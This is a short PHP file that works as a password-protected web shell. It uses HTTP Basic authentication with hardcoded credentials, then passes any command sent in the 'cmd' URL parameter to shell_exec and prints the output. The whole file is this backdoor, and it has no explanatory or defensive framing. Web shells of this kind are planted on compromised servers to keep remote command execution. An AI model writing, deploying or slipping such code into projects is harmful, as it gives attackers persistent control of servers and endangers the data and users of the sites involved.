<?php
$username = 'admin';
$password = 'ganteng';

if (!isset($_SERVER['PHP_AUTH_USER']) || !isset($_SERVER['PHP_AUTH_PW']) ||
    $_SERVER['PHP_AUTH_USER'] != $username || $_SERVER['PHP_AUTH_PW'] != $password) {
    header('WWW-Authenticate: Basic realm="Restricted Area"');
    header('HTTP/1.0 401 Unauthorized');
    echo 'Authentication required.';
    exit;
}

if (isset($_GET['cmd'])) {
    $cmd = escapeshellcmd($_GET['cmd']);
    $output = shell_exec($cmd);
    echo "<pre>$output</pre>";
} else {
    echo "No command provided.";
}
?>
